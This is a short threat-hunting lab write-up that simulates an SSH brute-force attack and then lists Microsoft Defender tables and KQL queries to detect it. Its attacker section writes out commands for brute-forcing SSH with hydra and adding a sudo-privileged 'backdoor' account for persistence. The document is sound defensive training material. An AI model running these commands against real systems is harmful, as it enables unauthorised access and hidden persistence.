# Threat Event (Brute Force)

## Steps the "Bad Actor" took to Create Logs and IoCs:

1. Create a wordlist for brute force attempt. `nano ~/custom-wordlist.txt`
2. Install hydra for brute force attack against "target machine". `sudo apt install hydra`
3. Execute hydra using the wordlist to get the correct password. `hydra -l <victim username> -P ~/custom-wordlist.txt ssh://victim IP`
4. SSH to target machine. `ssh user@target IP`
5. Create backdoors for persistence:
```
sudo useradd -m backdoor
sudo passwd backdoor
sudo usermod -aG sudo backdoor
```

## Tables Used to Detect IoCs:

| **Parameter Name**     | **Info** | **Description**                                                                                                             
|------------------------|----------|--------------------------------------------------------------------------------------------------------------------------|
| DeviceProcessEvents       | [Link](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table)       | Used to detect the execution of suspicious processes, such as reverse shells and backdoor scripts.                                           |
| DeviceNetworkEvents    | [Link](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicenetworkevents-table)       | Used to detect suspicious network connections, such as outbound connections to external IPs or internal network communications, which could indicate data exfiltration or lateral movement.                                                       |
| DeviceFileEvents    | [Link](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicefileevents-table) | Used to detect file creations, modifications, or suspicious file activity, such as setting up backdoor scripts and creating SSH key files for unauthorised access.                     |
| DeviceLogonEvents    | [Link](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicelogonevents-table) | Used to detect failed login attempts, brute force attacks, and logon activity from suspicious or unauthorised accounts.                     |

---

## Related Queries:

```kql
// Detect login events, such as login failures or successes.
DeviceLogonEvents
| where ActionType == "LogonFailed" or ActionType == "LogonSuccess"
| summarize FailedAttempts = count() by AccountName, DeviceName, bin(Timestamp, 5m)
| where FailedAttempts > 5

// Detect the copying, moving and/or encryption of files.
DeviceFileEvents
| project Timestamp, DeviceId, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessId

// Detect processes that might have been initiated be a malicious actor. 
DeviceProcessEvents
| project Timestamp, DeviceName, AccountName, ProcessCommandLine

// Detect network events from known IP ranges
DeviceNetworkEvents
| where ActionType == "ConnectionSuccess"
| where RemoteIP != "Internal"  
| project Timestamp, DeviceName, RemoteIP, RemotePort, Protocol, InitiatingProcessAccountName
```

---

## Created By:
- **Author Name**: Ruben Clarke
- **Author Contact**: https://www.linkedin.com/in/itsrubenclarke/
- **Date**: April 26, 2025

## Validated By:
- **Reviewer Name**:
- **Reviewer Contact**:
- **Validation Date**:

---

## Additional Notes:
**None**


## Revision History:
| **Version** | **Changes**                   | **Date**         | **Modified By**   |
|-------------|-------------------------------|------------------|-------------------|
| 1.0         | Initial draft                  | `April 26, 2025`  | `Ruben Clarke` 
